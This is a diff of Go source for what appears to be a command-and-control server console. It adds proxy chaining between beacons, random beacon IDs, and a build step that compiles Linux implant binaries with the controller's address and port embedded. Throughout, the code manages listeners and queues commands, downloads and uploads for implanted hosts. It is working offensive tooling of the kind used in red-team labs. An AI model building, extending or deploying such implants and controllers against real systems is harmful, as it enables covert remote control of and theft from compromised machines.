@@ -4,9 +4,12 @@ import (
 	"fmt"
 	"time"
 	"net"
+	"log"
+	"encoding/json"
 	"strconv"
 	"os"
 	"os/exec"
+	"math/rand"
 	"strings"
 	"bufio"
 )
@@ -24,10 +27,14 @@ type Beacon struct {
 	ExecBuffer []string
 	DownloadBuffer []string
 	UploadBuffer []string
+	ProxyClientBuffer []string
 	LastSeen time.Time
 }
 
-var listeners []HttpListener = make([]HttpListener, 0)
+const idBytes = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+
+var idLen int = 8
+var listeners []*HttpListener = make([]*HttpListener, 0)
 var beacons []*Beacon = make([]*Beacon, 0)
 var activeBeacon *Beacon
 var cmdArgs = map[string]string {
@@ -66,7 +73,7 @@ func registerBeacon(updateData CommandUpdate) (*Beacon) {
 	}
 
 	if beacon == nil {
-		beacon = &Beacon{updateData.Ip, updateData.Id, nil, nil, nil, time.Now()}
+		beacon = &Beacon{updateData.Ip, updateData.Id, nil, nil, nil, nil, time.Now()}
 		beacons = append(beacons, beacon)
 	} else {
 		beacon.LastSeen = time.Now()
@@ -82,11 +89,61 @@ func listBeacons() {
 }
 
 func createBeacon(listener int) {
-	ip := getIfaceIp(listeners[listener].iface)
-	port := strconv.Itoa(listeners[listener].port)
-	beaconName := "beacon" + ip + "." + port
-	exec.Command("/bin/sh", "-c", "env CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -ldflags '-X main.cmdAddress=" + ip + " -X main.cmdPort=" + port + " -X main.cmdHost=command.com' -o out/" + beaconName + " beacon/*.go").Output()
-	fmt.Println("Created beacon in out directory.")
+	reader := bufio.NewReader(os.Stdin)
+	fmt.Print("Proxy? (y/n): ")
+	input, err := reader.ReadString('\n')
+	ip := getIfaceIp(listeners[listener].Iface)
+	port := strconv.Itoa(listeners[listener].Port)
+	beaconName := "beacon" + ip + "." + port	
+	beaconId := genRandID()
+
+	if err != nil {
+		log.Fatal(err)
+	}
+
+	if input == "y\n" {
+		if len(beacons) == 0 {
+			fmt.Println("No beacons to proxy to.")
+			return
+		}
+		listBeacons()
+		fmt.Print("Choose beacon: ")
+		input, err := reader.ReadString('\n')
+		input = strings.ReplaceAll(input, "\n", "")
+
+		if err != nil {
+			fmt.Println("Invalid input.")
+			return
+		}
+		
+		beacon := getBeaconByIdOrIndex(input)
+
+		if beacon == nil {
+			fmt.Println(input + " is not a beacon.")
+			return
+		}
+
+		notifyBeaconOfProxyUpdate(beacon, beaconId)
+
+		fmt.Println("Using beacon " + beacon.Id + "@" + beacon.Ip + " as proxy.")
+		exec.Command("/bin/sh", "-c", "env CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -ldflags '-X main.id=" + beaconId + " -X main.cmdProxyId=" + beacon.Id + " -X main.cmdProxyIp=" + beacon.Ip + " -X main.cmdAddress=" + ip + " -X main.cmdPort=" + port + " -X main.cmdHost=command.com' -o out/" + beaconName + " beacon/*.go").Output()
+	} else {
+		fmt.Println("No proxy")
+		exec.Command("/bin/sh", "-c", "env CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -ldflags '-X main.id=" + beaconId + " -X main.cmdAddress=" + ip + " -X main.cmdPort=" + port + " -X main.cmdHost=command.com' -o out/" + beaconName + " beacon/*.go").Output()
+	}
+
+	fmt.Println("Saved beacon for listener " + getIfaceIp(listeners[listener].Iface) + ":" + strconv.Itoa(listeners[listener].Port) + "%" + listeners[listener].Iface + " to out/" + beaconName + ".")
+}
+
+func genRandID() string {
+	rand.Seed(time.Now().UTC().UnixNano())
+    b := make([]byte, idLen)
+    
+	for i := range b {
+        b[i] = idBytes[rand.Intn(len(idBytes))]
+    }
+    
+	return string(b)
 }
 
 func execOnBeacon(cmd []string) {
@@ -180,6 +237,10 @@ func getBeaconByIdOrIndex(id string) (*Beacon) {
 }
 
 func checkArgs(cmd[] string) (bool) {
+	if cmdArgs[cmd[0]] == "" {
+		return true
+	}
+
 	amt := strings.Count(cmdArgs[cmd[0]], "<")
 	if len(cmd[1:]) != amt && !strings.Contains(cmdArgs[cmd[0]], "...") {
 		if amt == 1 {
@@ -215,9 +276,9 @@ func startHttpListener(cmd []string) {
 	}
 
 	var HttpListener = HttpListener {
-		iface: cmd[1],
-		hostname: cmd[2],
-		port: port,
+		Iface: cmd[1],
+		Hostname: cmd[2],
+		Port: port,
 	}
 
 	err = HttpListener.startListener()
@@ -225,15 +286,27 @@ func startHttpListener(cmd []string) {
 		fmt.Println("Failed to start http server.")
 	}
 
-	fmt.Println("Started HTTP listener for " + getIfaceIp(HttpListener.iface) + ":" + cmd[3])
-	listeners = append(listeners, HttpListener)
+	fmt.Println("Started HTTP listener for " + getIfaceIp(HttpListener.Iface) + ":" + cmd[3])
+	listeners = append(listeners, &HttpListener)
 }
 
 func listListeners() {
 	fmt.Println("---- HTTP Listeners ----")
 	for i, listener := range listeners {
-		fmt.Println("[" + strconv.Itoa(i) + "] " + getIfaceIp(listener.iface) + ":" + strconv.Itoa(listener.port) + " (" + listener.iface + ")")
+		fmt.Println("[" + strconv.Itoa(i) + "] " + getIfaceIp(listener.Iface) + ":" + strconv.Itoa(listener.Port) + " (" + listener.Iface + ")")
 	}
+}
+
+func notifyBeaconOfProxyUpdate(proxy *Beacon, targetId string) {
+	pseudoBeacon := Beacon { "0.0.0.0", targetId, nil, nil, nil, nil, time.Now() }
+	data, err := json.Marshal(pseudoBeacon)
+	
+	if err != nil {
+		fmt.Println("Failed to notify beacon of proxy update.")
+		return
+	}
+
+	proxy.ProxyClientBuffer = append(proxy.ProxyClientBuffer, string(data))
 }
 
 func processInput(input string) {
@@ -288,14 +361,7 @@ func prompt() {
 
 func handleInput() {
 	reader := bufio.NewReader(os.Stdin)
-	first := true
 	for {
-		if first {
-			first = false
-		} else {
-			fmt.Println()
-		}
-		
 		prompt()
 		input, err := reader.ReadString('\n')
 
@@ -318,9 +384,9 @@ func main() {
 	}
 
 	var HttpListener = HttpListener {
-		iface: "tun0",
-		hostname: "command.com",
-		port: 8001,
+		Iface: "tun0",
+		Hostname: "command.com",
+		Port: 8001,
 	}
 
 	err = HttpListener.startListener()
@@ -328,6 +394,6 @@ func main() {
 		fmt.Println("Failed to start http server.")
 	}
 
-	listeners = append(listeners, HttpListener)
+	listeners = append(listeners, &HttpListener)
 	handleInput()
 }
